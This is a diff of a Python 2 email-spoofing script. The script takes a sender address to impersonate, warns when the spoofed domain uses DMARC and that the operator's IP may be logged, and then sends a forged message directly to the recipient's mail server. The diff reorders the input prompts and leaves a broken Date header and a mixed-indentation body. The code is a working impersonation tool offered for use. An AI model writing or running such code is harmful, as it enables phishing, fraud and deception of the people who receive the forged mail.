@@ -15,22 +15,23 @@ args = parser.parse_args()
 
 
 def reading(socket):
-        rec = socket.recv(512)
-        print("[REMOTE]: "+rec)
-        return rec
-
+	rec = socket.recv(512)
+	print("[REMOTE]: "+rec)
+	return rec
+	
 def writing(socket,data):
-        if args.tls and "RCPT" in data:
+        if args.tls and "RCPT" in data: 
+            # Lowercase to avoid that the server closes connection
             data = "rcpt to:" + data.split(":")[1]
             data = data.lower()
-        socket.send(data+'\r\n')
-        return
-
+	socket.send(data+'\r\n')
+	return
+	
 def check_code(data,code):
     return data[:3] == code
 
 
-
+		
 email_sender = raw_input("[SYSTEM]: Insert the sender of the email message: ")
 sender_domain = email_sender.split("@")[-1]
 try:
@@ -40,7 +41,7 @@ except (dns.resolver.NXDOMAIN,dns.resolver.NoAnswer) as err:
 else:
     print("[WARNING]: The domain you are trying to spoof is using DMRAC secuiry mechanism.\n\
 The email will be marked as SPAM and/or rejected.")
-
+    
     ans = raw_input("[WARNING]: Very likely your sending IP will be logged in a secuiry log if you proceed.\n\
 Do you want to continue? (y/n): ")
     while ans.lower() not in ["y","n"]:
@@ -50,6 +51,14 @@ Do you want to continue? (y/n): ")
 
 email_receiver = raw_input("[SYSTEM]: Insert the receiver of the email message: ")
 receiver_domain = email_receiver.split("@")[-1]
+name = raw_input("[SYSTEM]: Tell me the name you want to see in the From: field of the email: ")
+subj = raw_input("[SYSTEM]: Enter the subject of the email: ")
+
+print("[SYSTEM]: Enter the body of the email, terminate the input with <CRLF>.<CRLF>")
+sentinel = "." # ends when this string is seen
+text = "\r\n".join(iter(raw_input, sentinel))
+text += "\r\n."
+
 print("[SYSTEM]: Looking for an availabe MX server belonging to {0}".format(receiver_domain))
 
 answers = dns.resolver.query(receiver_domain, "MX")
@@ -61,15 +70,15 @@ for ans in answers:
         mx_server = ans.exchange.to_text()[:-1]
         print("[SYSTEM]: Connecting to {0} mail server".format(mx_server))
         sock.connect((mx_server,25))
-
+        
         rec = reading(sock)
         if not check_code(rec,"220"): continue
-
+                
         writing(sock,"HELO " + sender_domain)
         rec = reading(sock)
-        if not check_code(rec,"250"): continue
-
-        if args.tls:
+        if not check_code(rec,"250"): continue	
+        
+        if args.tls: 
             writing(sock,"STARTTLS")
             rec = reading(sock)
             if not check_code(rec,"220"):
@@ -79,39 +88,33 @@ for ans in answers:
             writing(sock,"HELO " + sender_domain)
             rec = reading(sock)
             if not check_code(rec,"250"): continue
-
+        
         writing(sock,"MAIL FROM: <{0}>".format(email_sender))
         rec = reading(sock)
-        if not check_code(rec,"250"): continue
-
+        if not check_code(rec,"250"): continue	
+        
         writing(sock,"RCPT TO: <{0}>".format(email_receiver))
         rec = reading(sock)
-        if not check_code(rec,"250"): continue
-
+        if not check_code(rec,"250"): continue	
+        
         writing(sock,"DATA")
         rec = reading(sock)
-        if not check_code(rec,"354"): continue
+        if not check_code(rec,"354"): continue 
 
-        name = raw_input("[SYSTEM]: Tell me the name you want to see in the From: field of the email: ")
         writing(sock,"From: {0} <{1}>".format(name,email_sender))
         writing(sock,"To: <{0}>".format(email_receiver))
-        subj = raw_input("[SYSTEM]: Enter the subject of the email: ")
         writing(sock,"Subject: {0}".format(subj))
         writing(sock,"Date: +%a, %d %b %Y %H:%M:%S %z".format(subj))
 
-        print("[SYSTEM]: Enter the body of the email, terminate the input with <CRLF>.<CRLF>")
-        sentinel = "." # ends when this string is seen
-        text = "\r\n".join(iter(raw_input, sentinel))
-        text += "\r\n."
-        writing(sock,text)
+        writing(sock,text)  # Writing the body of the email
 
         rec = reading(sock)
-        if not check_code(rec,"250"):
+        if not check_code(rec,"250"): 
             print("[ERROR]: Error in sending email:\n{0}".format(rec))
             sys.exit(3)
         else:
             print("[SYSTEM]: Mail sent")
-            sys.exit(0)
+            sys.exit(1)
 
     except Exception as err:
         print(err)
